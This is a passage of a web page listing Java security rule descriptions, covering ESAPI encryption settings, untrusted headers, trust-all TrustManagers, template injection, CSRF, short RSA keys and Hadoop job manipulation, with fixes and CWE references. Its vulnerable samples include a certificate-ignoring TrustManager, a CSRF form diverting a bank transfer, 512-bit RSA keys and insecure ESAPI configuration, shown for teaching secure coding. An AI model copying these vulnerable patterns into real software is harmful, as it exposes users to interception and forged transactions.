                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7566">Use of ESAPI Encryptor</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#needed">Needed</a></li>
<li><a href="#needed-to-have-a-solid-auth-encryption">Needed to have a solid auth. encryption</a></li>
<li><a href="#cbc-mode-should-be-removed-to-avoid-padding-oracle">CBC mode should be removed to avoid padding oracle</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Use of ESAPI Encryptor</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    The ESAPI has a small history of vulnerabilities within the cryptography component. Here is a quick validation list to
    make sure the Authenticated Encryption is working as expected.
</p>
<p><b>1. Library Version</b></p>
<p>
    This issue is corrected in ESAPI version 2.1.0. Versions &lt;= 2.0.1 are vulnerable to a MAC bypass (CVE-2013-5679).<br/>
</p>
<p>
    For Maven users, the plugin <a href="http://mojo.codehaus.org/versions-maven-plugin/">versions</a> can be called using the
    following command. The effective version of ESAPI will be available in the output.<br/>
<pre>$ mvn versions:display-dependency-updates</pre>
<br/>Output:<br/>
<pre>
[...]
[INFO] The following dependencies in Dependencies have newer versions:
[INFO]   org.slf4j:slf4j-api ................................... 1.6.4 -&gt; 1.7.7
[INFO]   org.owasp.esapi:esapi ................................. 2.0.1 -&gt; 2.1.0
[...]
    </pre>
</p>
<p>
    or by looking at the configuration directly.<br/>
<pre>
&lt;dependency&gt;
    &lt;groupId&gt;org.owasp.esapi&lt;/groupId&gt;
    &lt;artifactId&gt;esapi&lt;/artifactId&gt;
    &lt;version&gt;2.1.0&lt;/version&gt;
&lt;/dependency&gt;</pre>
</p>
<p>
    For Ant users, the jar used should be <a href="http://repo1.maven.org/maven2/org/owasp/esapi/esapi/2.1.0/esapi-2.1.0.jar">esapi-2.1.0.jar</a>.
</p>
<p><b>2. Configuration:</b></p>
<p>
    The library version 2.1.0 is still vulnerable to key size being changed in the ciphertext definition (CVE-2013-5960). Some precautions need to be taken.<br/>
<br/>
<div><b>The cryptographic configuration of ESAPI can also be vulnerable if any of these elements are present:</b><br/>
<b>Insecure configuration:</b><br/>
<pre>
Encryptor.CipherText.useMAC=false</pre></div></p>
<p>Encryptor.EncryptionAlgorithm=AES
Encryptor.CipherTransformation=AES/CBC/PKCS5Padding</p>
<p>Encryptor.cipher_modes.additional_allowed=CBC</p></p>


<p>
<div>
<b>Secure configuration:</b><br/>
<pre></pre></div></p>
<h1 id="needed">Needed</h1>
<p>Encryptor.CipherText.useMAC=true</p>
<h1 id="needed-to-have-a-solid-auth-encryption">Needed to have a solid auth. encryption</h1>
<p>Encryptor.EncryptionAlgorithm=AES
Encryptor.CipherTransformation=AES/GCM/NoPadding</p>
<h1 id="cbc-mode-should-be-removed-to-avoid-padding-oracle">CBC mode should be removed to avoid padding oracle</h1>
<p>Encryptor.cipher_modes.additional_allowed=</p>


<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://owasp-esapi-java.googlecode.com/svn/trunk/documentation/ESAPI-security-bulletin1.pdf">ESAPI Security bulletin 1 (CVE-2013-5679)</a><br/>
<a href="http://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5679">Vulnerability Summary for CVE-2013-5679</a><br/>
<a href="http://www.synacktiv.com/ressources/synacktiv_owasp_esapi_hmac_bypass.pdf">Synactiv: Bypassing HMAC validation in OWASP ESAPI symmetric encryption</a><br/>
<a href="http://cwe.mitre.org/data/definitions/310.html">CWE-310: Cryptographic Issues</a><br/>
<a href="http://lists.owasp.org/pipermail/esapi-dev/2015-March/002533.html">ESAPI-dev mailing list: Status of CVE-2013-5960</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7487">Untrusted User-Agent header</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted User-Agent header</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The header "User-Agent" can easily be spoofed by the client. Adopting different behaviors based on the User-Agent (for
crawler UA) is not recommended.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/807.html">CWE-807: Untrusted Inputs in a Security Decision</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1078">Setting Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>One or more system settings or configuration elements can be externally controlled by a user.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn.</p>
</li>
<li>
<p>In general, do not allow user-provided or otherwise untrusted data to control sensitive values.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">conn</span><span class="o">.</span><span class="na">setCatalog</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"catalog"</span><span class="o">));</span>
</pre></div>
</td></tr></table>
<p>In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/15.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7497">TrustManager that accept any certificates</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>TrustManager that accept any certificates</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>Empty TrustManager implementations are often used to connect easily to a host that is not signed by a root
<a href="http://en.wikipedia.org/wiki/Certificate_authority">certificate authority</a>. As a consequence, this is vulnerable to
<a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack">Man-in-the-middle attacks</a>
since the client will trust any certificate.
</p>
<p>
A TrustManager allowing specific certificates (based on a truststore for example) should be built.
Detailed information for a proper implementation is available at:
<a href="http://stackoverflow.com/a/6378872/89769">[1]</a>
<a href="http://stackoverflow.com/a/5493452/89769">[2]</a>
</p>
<br/>
<p>
<b>Vulnerable Code:</b><br/>
<pre>class TrustAllManager implements X509TrustManager {
    @Override
    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
        //Trust any client connecting (no certificate validation)
    }
    @Override
    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
        //Trust any remote server (no certificate validation)
    }
    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }
}</pre>
</p>
<br/>
<p>
<b>Solution (TrustMangager based on a keystore):</b><br/>
<pre>KeyStore ks = //Load keystore containing the certificates trusted
SSLContext sc = SSLContext.getInstance("TLS");
TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
tmf.init(ks);
sc.init(kmf.getKeyManagers(), tmf.getTrustManagers(),null);
</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://projects.webappsec.org/w/page/13246945/Insufficient%20Transport%20Layer%20Protection">WASC-04: Insufficient Transport Layer Protection</a><br/>
<a href="http://cwe.mitre.org/data/definitions/295.html">CWE-295: Improper Certificate Validation</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7152">May expose internal static state by storing a mutable object into a static field</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>May expose internal static state by storing a mutable object into a static field</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p> This code stores a reference to an externally mutable object into a static
   field.
   If unchecked changes to
   the mutable object would compromise security or other
   important properties, you will need to do something different.
  Storing a copy of the object is better approach in many situations.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1098">Server-Side Template Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>To present dynamic data on a web page or email, template engines are widely used by web applications.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Without proper validation of user input in templates, it will enable Server-Side Template Injection, a critical vulnerability that is extremely easy to mistake for Cross-Site Scripting XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution, turning every vulnerable application into a potential pivot point.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Use a trivial template engine.</p>
</li>
<li>
<p>Sandbox it inside a relatively safe Docker container.</p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-blackhat">
<p>https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf <a class="footnote-backref" href="#fnref-blackhat" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0093">Cross-Site Request Forgery(CSRF)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ol>
<li>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard.    </li>
<li>Ensure that the application is free of cross-site scripting issues(CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script. </li>
<li>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</li>
<li>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation. </li>
<li>Do not use the GET method for any request that triggers a state change. </li>
<li>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons. </li>
</ol>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>Assume that your bank's website provides a form that allows transferring money from the currently logged in user to another bank account. For example, the HTTP request might look like:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/transfer</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">bank.example.com</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=randomid; Domain=bank.example.com; Secure; HttpOnly</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>

amount=100.00&amp;routingNumber=1234&amp;account=9876
</pre></div>
</td></tr></table>
<p>Now pretend you authenticate to your bank's website and then, without logging out, visit an evil website. The evil website contains an HTML page with the following form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://bank.example.com/transfer"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"amount"</span>
    <span class="na">value=</span><span class="s">"100.00"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"routingNumber"</span>
    <span class="na">value=</span><span class="s">"evilsRoutingNumber"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"account"</span>
    <span class="na">value=</span><span class="s">"evilsAccountNumber"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span>
    <span class="na">value=</span><span class="s">"Win Money!"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></div>
</td></tr></table>
<p>You like to win money, so you click on the submit button. In the process, you have unintentionally transferred $100 to a malicious user. This happens because, while the evil website cannot see your cookies, the cookies associated with your bank are still sent along with the request.</p>
<p>How to fix: See "Potential Mitigations"
References
================</p>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE352">
<p>https://cwe.mitre.org/data/definitions/352.html <a class="footnote-backref" href="#fnref-CWE352" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF).html <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-352.html">CWE-352</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7480">Untrusted servlet parameter</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted servlet parameter</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The Servlet can read GET and POST parameters from various methods. The value obtained should be considered unsafe.
You may need to validate or sanitize those values before passing them to sensitive APIs such as:</p>
<ul>
<li>SQL query (May lead to SQL injection)</li>
<li>File opening (May lead to path traversal)</li>
<li>Command execution (Potential Command injection)</li>
<li>HTML construction (Potential XSS)</li>
<li>etc...</li>
</ul></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7549">RSA usage with short key</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>RSA usage with short key</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    The NIST recommends the use of <u>2048 bits and higher</u> keys for the RSA algorithm.
</p>
<blockquote>
    "Digital Signature Verification | RSA: 1024 ≤ len(n) &lt; 2048 | Legacy-use"<br/>
    "Digital Signature Verification | RSA: len(n) ≥ 2048 | Acceptable"<br/>
    - <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.7</a>
</blockquote></p>
<p><b>Vulnerable Code:</b><br/>
<pre>
KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
keyGen.initialize(512);
</pre>
</p>
<p><b>Solution:</b><br/>
The KeyPairGenerator creation should be as follows with at least 2048 bit key size.<br/>
<pre>
KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
keyGen.initialize(2048);
</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>critical</p>
<h1 id="references">References</h1>
<p><a href="http://csrc.nist.gov/groups/ST/toolkit/key_management.html">NIST: Latest publication on key management</a><br/>
<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.7</a><br/>
<a href="http://www.emc.com/emc-plus/rsa-labs/standards-initiatives/how-large-a-key-should-be-used.htm">RSA Laboratories: 3.1.5 How large a key should be used in the RSA cryptosystem?</a><br/>
<a href="http://en.wikipedia.org/wiki/Key_size#Asymmetric%5Falgorithm%5Fkey%5Flengths">Wikipedia: Asymmetric algorithm key lengths</a><br/>
<a href="http://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a><br/>
<a href="http://www.keylength.com/en/compare/">Keylength.com (BlueKrypt): Aggregate key length recommendations.</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1102">Hadoop Job Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software may allow attackers to manipulate the core components of the Hadoop cluster where client applications run.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Jobs that are submitted to a Hadoop cluster may be changed maliciously in a vulnerable environment.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The vulnerable code shows how untrusted user inputs are used to manipulate Hadoop job through the process of job submission:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">JobConf</span> <span class="nf">bad</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="o">...</span>
    <span class="kt">int</span> <span class="n">reducers</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
    <span class="o">...</span>
    <span class="n">JobConf</span> <span class="n">job</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JobConf</span><span class="o">(</span><span class="k">new</span> <span class="n">COnfiguration</span><span class="o">(),</span> 
                              <span class="n">OptimizedDataJoinJob</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="o">...</span>
    <span class="c1">// reducers may exceed the acceptable range.</span>
    <span class="n">job</span><span class="o">.</span><span class="na">setNumReduceTasks</span><span class="o">(</span><span class="n">reducers</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">job</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7485">HTTP headers untrusted</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>HTTP headers untrusted</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>Request headers can easily be altered by the requesting user. In general, no assumption should be made that 
the request came from a regular browser without modification by an attacker. As such, it is recommended that you 
not trust this value in any security decisions you make with respect to a request.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/807.html">CWE-807: Untrusted Inputs in a Security Decision</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
